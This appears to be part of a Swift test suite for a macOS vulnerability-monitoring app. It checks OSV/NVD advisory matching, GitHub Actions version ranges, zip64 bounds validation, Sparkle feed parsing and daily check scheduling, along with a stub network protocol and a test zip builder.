            expect(scopedServers.map { "\($0.version) \($0.path.dropFirst(mcpRoot.count))" } == ["1.0.0 /.mcp.json#gh", "2.0.0 /.mcp.json#gh#/p/b"], "same-named servers for different projects are both listed, in a fixed order, and identical ones once")
            try FileManager.default.removeItem(atPath: mcpRoot)
            let twoSyn = Installation(product: "crates:syn", name: "syn", version: "1.0.109", path: "/c/Cargo.lock#syn@1.0.109", domain: "projects", ecosystem: "crates.io", packageName: "syn", manager: "cargo", location: "/c")
            expect(Commands.commands(for: Finding(source: "osv", installation: twoSyn, kind: .security, fixed: "1.0.110", reason: "", action: "", links: [])).first?.text == "cd /c && cargo update -p syn@1.0.109 --precise 1.0.110", "cargo is told which version of the crate to update")

            // OSV: pages, commit hashes and action names.
            var paged: [String: [String]] = ["npm|a|1": ["GHSA-1"]]
            let tokens = OSV.merge([["vulns": [["id": "GHSA-1"], ["id": "GHSA-2"]], "next_page_token": "t1"], [:]], keys: ["npm|a|1", "npm|b|1"], into: &paged)
            expect(paged == ["npm|a|1": ["GHSA-1", "GHSA-2"]] && tokens == ["npm|a|1": "t1"], "a result with a page token has more to fetch, and a repeated advisory is kept once")
            let gitRange: [String: Any] = ["affected": [["package": ["ecosystem": "PyPI", "name": "Some_Pkg"], "ranges": [["type": "GIT", "events": [["introduced": "0"], ["fixed": "74ea7cf7a1b2c3d4e5f60718293a4b5c6d7e8f90"]]], ["type": "ECOSYSTEM", "events": [["introduced": "0"], ["fixed": "4.0.2"]]]]]]]
            expect(OSV.vuln("PYSEC-1", from: gitRange).fixed == ["PyPI|some-pkg": ["4.0.2"]], "a commit hash from a GIT range is not a fixed version")
            expect(GitHubActions.spellings(["SonarSource/scan-action", "actions/checkout"]) == ["SonarSource/scan-action", "actions/checkout", "sonarsource/scan-action"], "an action is asked for as written and in lowercase, since OSV matches the name exactly")
            let lastOnly = GitHubActions.Range(introduced: "0", fixed: nil, lastAffected: "4.2.0")
            expect(GitHubActions.affected("4.999999.999999", lastOnly, moving: true), "@v4 may still point at a last affected 4.x release")
            expect(!GitHubActions.affected("5.999999.999999", lastOnly, moving: true) && !GitHubActions.affected("4.3.0", lastOnly), "a later major, or a pinned later release, is past the last affected one")
            expect(GitHubActions.affected("4.999999.999999", GitHubActions.Range(introduced: "0", fixed: nil, lastAffected: "5.1.0"), moving: true), "every 4.x is at or below a last affected 5.1.0")
            // NVD entries for another platform's build of a product.
            expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:windows:*:*","versionEndExcluding":"9"}"#), cpe: "haxx:curl", version: Version("8.5.0")!) == nil, "an entry for the Windows build doesn't match the Mac copy")
            expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:macos:*:*","versionEndExcluding":"9"}"#), cpe: "haxx:curl", version: Version("8.5.0")!) != nil, "an entry for the macOS build does")
            expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:node.js:*:*","versionEndExcluding":"9"}"#), cpe: "haxx:curl", version: Version("8.5.0")!) != nil, "a target that isn't an operating system still matches")
            // A zip64 record whose numbers don't fit, or point outside the download, is refused instead of computed with.
            func zipTail(offset: UInt64, length: UInt64, size: Int) -> Data {
                func le(_ value: UInt64, _ bytes: Int) -> [UInt8] { (0..<bytes).map { UInt8((value >> (8 * UInt64($0))) & 0xFF) } }
                var record: [UInt8] = le(0x06064b50, 4) + le(44, 8) + le(45, 2) + le(45, 2) + le(0, 4) + le(0, 4) + le(1, 8) + le(1, 8)
                record += le(length, 8) + le(offset, 8)
                let recordPlace = UInt64(size - 56 - 20 - 22)
                let locator: [UInt8] = le(0x07064b50, 4) + le(0, 4) + le(recordPlace, 8) + le(1, 4)
                let end: [UInt8] = le(0x06054b50, 4) + le(0, 2) + le(0, 2) + le(0xFFFF, 2) + le(0xFFFF, 2) + le(0xFFFF_FFFF, 4) + le(0xFFFF_FFFF, 4) + le(0, 2)
                return Data(record + locator + end)
            }
            expect(ReleasePeek.directory(zipTail(offset: 1_000, length: 500, size: 10_000), size: 10_000).map { [$0.offset, $0.length] } == [1_000, 500], "a zip64 directory inside the download is read")
            expect(ReleasePeek.directory(zipTail(offset: UInt64.max, length: 500, size: 10_000), size: 10_000) == nil, "a zip64 offset too large to hold is refused")
            expect(ReleasePeek.directory(zipTail(offset: 0x7FFF_FFFF_FFFF_FFFF, length: 500, size: 10_000), size: 10_000) == nil, "a zip64 directory outside the download is refused")
            // A feed's delta patches are enclosures too; the release's download is the one outside sparkle:deltas.
            let deltaFeed = "<rss xmlns:sparkle=\"http://www.andymatuschak.org/xml-namespaces/sparkle\"><channel><item><enclosure url=\"https://example.com/App-2.1.zip\" sparkle:version=\"210\" sparkle:shortVersionString=\"2.1\"/><sparkle:deltas><enclosure url=\"https://example.com/200-210.delta\" sparkle:version=\"210\" sparkle:deltaFrom=\"200\"/></sparkle:deltas></item></channel></rss>"
            expect(SparkleFeeds.releases(Data(deltaFeed.utf8)).map(\.url) == ["https://example.com/App-2.1.zip"], "a delta patch doesn't replace the release's download")
            // The daily check: a day counts once a check reached its sources, and a failed one is tried again later.
            let nine = Schedule.calendar.date(from: DateComponents(year: 2026, month: 11, day: 9, hour: 9, minute: 30))!
            expect(!Schedule.isDue(now: nine, lastDay: nil, lastAttempt: nine.addingTimeInterval(-600)) && Schedule.isDue(now: nine, lastDay: nil, lastAttempt: nine.addingTimeInterval(-1800)), "a check that didn't count is tried again after half an hour, not every minute")
            expect(!Schedule.reached([SourceCheck(id: "osv", name: "OSV", status: "failed", detail: "offline")]) && Schedule.reached([SourceCheck(id: "osv", name: "OSV", status: "checked", detail: "ok"), SourceCheck(id: "node", name: "Node", status: "failed", detail: "x")]), "a check that couldn't reach OSV hasn't done the day's check")
            expect(Schedule.counts(nine.addingTimeInterval(-3600)) && !Schedule.counts(nine.addingTimeInterval(-3 * 3600)), "a check finished just before 9 counts for the day; one at 6:30 doesn't")
            let devSupport = URL(fileURLWithPath: "/tmp/shipshape-support")
            expect(StateFolder.folder(in: devSupport, bundleID: "sh.todd.security-monitor.dev").lastPathComponent == "Shipshape Dev", "the development copy keeps its data apart from the installed app's")
        }
        print("Passed \(count) rule, failure-retention, notification-fingerprint and scheduling checks")
    }
}

// Serves canned responses to Fetch in tests, delivered in 64 KB chunks like a real transfer.
final class StubProtocol: URLProtocol {
    static var responses: [String: (status: Int, headers: [String: String], body: Data)] = [:]
    static var ranged: [String: Data] = [:]  // downloads served in parts, as a CDN serves byte ranges
    static var served = 0                    // bytes of ranged downloads sent
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
    override func startLoading() {
        if let whole = Self.ranged[request.url!.absoluteString], let match = captures("^bytes=([0-9]+)-([0-9]+)$", request.value(forHTTPHeaderField: "Range") ?? "").first,
           let start = Int(match[1]), let last = Int(match[2]), start < whole.count {
            let end = min(last, whole.count - 1), body = whole.subdata(in: start..<(end + 1))
            Self.served += body.count
            client?.urlProtocol(self, didReceive: HTTPURLResponse(url: request.url!, statusCode: 206, httpVersion: "HTTP/1.1",
                                                                  headerFields: ["Content-Range": "bytes \(start)-\(end)/\(whole.count)", "Content-Length": "\(body.count)", "Last-Modified": "Thu, 05 Nov 2026 15:45:48 GMT"])!,
                                cacheStoragePolicy: .notAllowed)
            client?.urlProtocol(self, didLoad: body)
            client?.urlProtocolDidFinishLoading(self)
            return
        }
        let stub = Self.responses[request.url!.absoluteString] ?? (404, [:], Data())
        client?.urlProtocol(self, didReceive: HTTPURLResponse(url: request.url!, statusCode: stub.status, httpVersion: "HTTP/1.1", headerFields: stub.headers)!, cacheStoragePolicy: .notAllowed)
        var offset = 0
        while offset < stub.body.count {
            let end = min(offset + 65_536, stub.body.count)
            client?.urlProtocol(self, didLoad: stub.body.subdata(in: offset..<end))
            offset = end
        }
        client?.urlProtocolDidFinishLoading(self)
    }
    override func stopLoading() {}
}

// A zip built for tests, with each file stored or deflated, its directory and end record. CRCs are left zero, since
// ReleasePeek doesn't check them.
enum TestZip {
    static func plist(_ values: [String: String]) -> Data { try! PropertyListSerialization.data(fromPropertyList: values, format: .xml, options: 0) }
    static func make(_ files: [(name: String, data: Data, deflate: Bool)]) -> Data {
        func le16(_ value: Int) -> Data { withUnsafeBytes(of: UInt16(value).littleEndian) { Data($0) } }
        func le32(_ value: Int) -> Data { withUnsafeBytes(of: UInt32(value).littleEndian) { Data($0) } }
        var zip = Data(), directory = Data()
        for file in files {
            let name = Data(file.name.utf8)
            var packed = file.data
            if file.deflate {
                var output = [UInt8](repeating: 0, count: file.data.count + 1024)
                let source = [UInt8](file.data)
                let written = compression_encode_buffer(&output, output.count, source, source.count, nil, COMPRESSION_ZLIB)
                packed = Data(output.prefix(written))
            }
            let offset = zip.count, method = file.deflate ? 8 : 0
            let sizes: [Data] = [le32(0), le32(packed.count), le32(file.data.count), le16(name.count)]
            let local: [Data] = [le32(0x04034b50), le16(20), le16(0), le16(method), le16(0), le16(0)] + sizes + [le16(0), name, packed]
            let entry: [Data] = [le32(0x02014b50), le16(20), le16(20), le16(0), le16(method), le16(0), le16(0)] + sizes + [le16(0), le16(0), le16(0), le16(0), le32(0), le32(offset), name]
            local.forEach { zip.append($0) }
            entry.forEach { directory.append($0) }
        }
        let start = zip.count
        let end: [Data] = [directory, le32(0x06054b50), le16(0), le16(0), le16(files.count), le16(files.count), le32(directory.count), le32(start), le16(0)]
        end.forEach { zip.append($0) }
        return zip
    }
}
